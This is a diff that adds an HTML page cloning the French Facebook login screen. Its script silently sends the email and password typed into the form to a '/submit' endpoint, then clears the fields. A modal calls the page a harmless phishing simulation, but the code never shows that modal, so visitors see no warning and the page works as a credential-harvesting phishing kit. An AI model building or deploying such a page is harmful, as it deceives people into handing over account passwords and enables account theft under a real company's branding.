@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook – Connexion ou inscription</title>
+  <link href="https://fonts.googleapis.com/css2?family=Helvetica+Neue:wght@400;700&display=swap" rel="stylesheet"/>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background-color: #f0f2f5;
+      font-family: Helvetica, Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+
+
+    /* ── MAIN LAYOUT ── */
+    .container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 32px;
+      width: 90%;
+      max-width: 780px;
+      flex-wrap: wrap;
+    }
+
+    /* ── LEFT COLUMN ── */
+    .left {
+      flex: 1;
+      min-width: 240px;
+    }
+    .logo {
+      color: #1877f2;
+      font-size: 56px;
+      font-weight: 700;
+      letter-spacing: -2px;
+      margin-bottom: 16px;
+      font-family: Georgia, 'Times New Roman', serif;
+    }
+    .tagline {
+      font-size: 22px;
+      line-height: 1.4;
+      color: #1c1e21;
+    }
+
+    /* ── FORM CARD ── */
+    .card {
+      background: #fff;
+      border-radius: 8px;
+      padding: 20px;
+      box-shadow: 0 2px 12px rgba(0,0,0,.15);
+      width: 100%;
+      max-width: 360px;
+    }
+
+    .card input[type="text"],
+    .card input[type="email"],
+    .card input[type="password"] {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 17px;
+      margin-bottom: 12px;
+      outline: none;
+      transition: border-color .2s;
+    }
+    .card input:focus { border-color: #1877f2; }
+
+    .btn-login {
+      width: 100%;
+      background: #1877f2;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      padding: 14px;
+      font-size: 20px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background .2s;
+    }
+    .btn-login:hover { background: #166fe5; }
+
+    .divider {
+      border: none;
+      border-top: 1px solid #dddfe2;
+      margin: 20px 0;
+    }
+
+    .btn-create {
+      display: block;
+      width: fit-content;
+      margin: 0 auto;
+      background: #42b72a;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      padding: 14px 24px;
+      font-size: 17px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background .2s;
+    }
+    .btn-create:hover { background: #36a420; }
+
+    .forgot {
+      display: block;
+      text-align: center;
+      margin-top: 16px;
+      color: #1877f2;
+      font-size: 14px;
+      text-decoration: none;
+    }
+    .forgot:hover { text-decoration: underline; }
+
+    /* ── MODAL ── */
+    .overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,.6);
+      z-index: 100;
+      align-items: center;
+      justify-content: center;
+    }
+    .overlay.active { display: flex; }
+
+    .modal {
+      background: #fff;
+      border-radius: 10px;
+      padding: 32px 28px;
+      max-width: 460px;
+      width: 90%;
+      text-align: center;
+      animation: popIn .3s ease;
+    }
+    @keyframes popIn {
+      from { transform: scale(.85); opacity: 0; }
+      to   { transform: scale(1);   opacity: 1; }
+    }
+
+    .modal .icon { font-size: 52px; margin-bottom: 12px; }
+    .modal h2 { font-size: 22px; color: #1c1e21; margin-bottom: 8px; }
+    .modal p  { font-size: 15px; color: #444; line-height: 1.6; margin-bottom: 16px; }
+
+    .modal .data-box {
+      background: #f0f2f5;
+      border-radius: 6px;
+      padding: 12px 16px;
+      font-size: 13px;
+      text-align: left;
+      color: #333;
+      margin-bottom: 20px;
+      word-break: break-all;
+    }
+    .modal .data-box span { font-weight: bold; color: #c0392b; }
+
+    .modal button {
+      background: #1877f2;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      padding: 12px 28px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+    .modal button:hover { background: #166fe5; }
+
+    /* ── FOOTER ── */
+    footer {
+      margin-top: 28px;
+      font-size: 12px;
+      color: #737373;
+      text-align: center;
+      width: 90%;
+      max-width: 780px;
+    }
+    footer a { color: #737373; text-decoration: none; margin: 0 4px; }
+    footer a:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
+
+  <!-- Contenu principal -->
+  <div class="container">
+
+    <!-- Colonne gauche -->
+    <div class="left">
+      <div class="logo">facebook</div>
+      <p class="tagline">Facebook vous aide à communiquer et à rester en contact avec toutes les personnes qui comptent dans votre vie.</p>
+    </div>
+
+    <!-- Formulaire -->
+    <div class="card">
+      <input type="email"    id="email"    placeholder="Adresse e-mail ou téléphone" />
+      <input type="password" id="password" placeholder="Mot de passe" />
+      <button class="btn-login" onclick="handleLogin()">Se connecter</button>
+      <a href="#" class="forgot">Mot de passe oublié ?</a>
+      <hr class="divider"/>
+      <button class="btn-create" onclick="handleLogin()">Créer un nouveau compte</button>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer>
+    <a href="#">Français (France)</a>
+    <a href="#">English (US)</a>
+    <a href="#">Español</a>
+    <a href="#">Português (Brasil)</a>
+    <br/><br/>
+    <a href="#">Inscription</a> · <a href="#">Connexion</a> · <a href="#">Messenger</a> ·
+    <a href="#">Facebook Lite</a> · <a href="#">Vidéo</a> · <a href="#">Lieux</a> ·
+    <a href="#">Jeux</a> · <a href="#">Marketplace</a> · <a href="#">Meta Pay</a>
+    <br/><br/>
+    Meta © 2026
+  </footer>
+
+  <!-- Modal pédagogique -->
+  <div class="overlay" id="overlay">
+    <div class="modal">
+      <div class="icon">🎓</div>
+      <h2>Simulation de Phishing réussie !</h2>
+      <p>
+        Dans une vraie attaque, vos identifiants viennent d'être <strong>volés</strong>.
+        Voici ce qu'un attaquant aurait capturé :
+      </p>
+      <div class="data-box" id="capturedData"></div>
+      <p style="font-size:13px; color:#c0392b; font-weight:bold;">
+        ✅ Dans ce projet, les données sont uniquement stockées localement (fichier CSV simulé).<br/>
+        Aucune vraie information n'est transmise.
+      </p>
+      <button onclick="closeModal()">J'ai compris – Fermer</button>
+    </div>
+  </div>
+
+  <script>
+    async function handleLogin() {
+      const email    = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value.trim();
+
+      const entry = {
+        email    : email    || '(vide)',
+        password : password || '(vide)'
+      };
+
+      // Envoie les données au serveur Python
+      try {
+        await fetch('/submit', {
+          method  : 'POST',
+          headers : { 'Content-Type': 'application/json' },
+          body    : JSON.stringify(entry)
+        });
+      } catch(e) {}
+
+      // Vider les champs silencieusement
+      document.getElementById('email').value = '';
+      document.getElementById('password').value = '';
+    }
+
+    function closeModal() {
+      document.getElementById('overlay').classList.remove('active');
+      document.getElementById('email').value    = '';
+      document.getElementById('password').value = '';
+    }
+  </script>
+
+</body>
+</html>
